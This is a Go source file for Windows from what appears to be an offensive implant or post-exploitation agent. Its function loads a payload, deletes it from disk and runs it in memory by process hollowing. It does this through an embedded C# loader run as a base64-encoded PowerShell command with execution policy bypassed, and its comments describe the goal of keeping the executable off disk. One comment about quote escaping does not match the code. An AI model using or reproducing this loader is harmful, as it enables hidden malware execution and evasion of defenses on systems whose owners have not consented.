//go:build windows

package main

import (
	"bytes"
	"context"
	_ "embed"
	"encoding/base64"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"strings"
)

// The C# PE loader used by the shell handler's inmemory plugin. Same
// source, same semantics: CreateProcess suspended, NtUnmapViewOfSection
// on the host, VirtualAllocEx for the payload, section-by-section
// WriteProcessMemory, relocate, resolve imports, SetThreadContext,
// ResumeThread.
//
// Embedding the source as a byte slice lets the Go agent invoke it
// through Add-Type without shipping a second binary.
//
//go:embed embed/_win_pe_loader.cs
var peLoaderCS []byte

// execPEInMemory loads `path` into a byte slice, removes the file
// from disk, and invokes the C# PeMemoryLoader on the raw PE bytes.
// The PE never lands on disk as an executable — it lives only in the
// agent's memory and in the target process' memory after hollowing.
//
// PowerShell + Add-Type is required. On targets where PowerShell is
// disabled or .NET is restricted, this fails; there is no native-Go
// PE loader in this codebase.
func execPEInMemory(ctx context.Context, path string,
	args []string) (string, int, error) {

	raw, err := os.ReadFile(path)
	if err != nil {
		return "", -1, fmt.Errorf("read payload: %w", err)
	}
	// Remove the on-disk payload before invocation. The C# loader
	// reads its bytes from the PowerShell script, not from disk, so
	// the file is no longer needed.
	_ = os.Remove(path)

	// The C# source is one large here-string. The cleanest way to
	// deliver it to PowerShell without escaping is to base64 the
	// entire script (source + call site) and use -EncodedCommand.
	//
	// The argument line passed to the payload is escaped for the C#
	// string literal in the call: single quotes doubled.
	argLine := strings.Join(args, " ")
	argLineCS := strings.ReplaceAll(argLine, `\`, `\\`)
	argLineCS = strings.ReplaceAll(argLineCS, `"`, `\"`)

	script := fmt.Sprintf(`
$ErrorActionPreference = 'Stop'
$loader = @"
%s
"@
$peB64 = '%s'
$bytes = [Convert]::FromBase64String($peB64)
try {
  Add-Type -TypeDefinition $loader -Language CSharp -ErrorAction Stop
} catch {
  if ($_.Exception.Message -notmatch 'already exists|Cannot add type') {
    throw
  }
}
$result = [PeMemoryLoader]::Execute($bytes, '%s')
if ($result.Error) {
  [Console]::Error.Write($result.Error)
  exit 1
}
[Console]::Out.Write($result.StdOut)
[Console]::Error.Write($result.StdErr)
exit $result.ExitCode
`,
		string(peLoaderCS),
		base64.StdEncoding.EncodeToString(raw),
		argLineCS,
	)

	// -EncodedCommand takes UTF-16LE base64. Same encoding the shell
	// handler uses for its PowerShell delivery.
	encoded := base64.StdEncoding.EncodeToString(
		utf16LEBytes(script))

	cmd := exec.CommandContext(ctx,
		"powershell.exe",
		"-NoProfile", "-NoLogo", "-NonInteractive",
		"-ExecutionPolicy", "Bypass",
		"-EncodedCommand", encoded,
	)
	cmd.Env = sanitizedEnv()

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err = cmd.Run()
	exitCode := 0
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			exitCode = ee.ExitCode()
		} else {
			return stderr.String(), -1, err
		}
	}

	combined := stdout.String() + stderr.String()
	return combined, exitCode, nil
}

// execELFInMemory is a stub on Windows. ELF execution requires Linux.
func execELFInMemory(_ context.Context, _ string,
	_ []string) (string, int, error) {
	return "", -1, errors.New("elf in-memory execution requires a Linux target")
}

// utf16LEBytes returns the UTF-16LE encoding of s with a trailing
// NUL. Used to prepare -EncodedCommand input for powershell.exe.
func utf16LEBytes(s string) []byte {
	r := make([]rune, 0, len(s))
	for _, c := range s {
		r = append(r, c)
	}
	out := make([]byte, 0, len(r)*2)
	for _, c := range r {
		out = append(out, byte(c&0xFF), byte((c>>8)&0xFF))
	}
	return out
}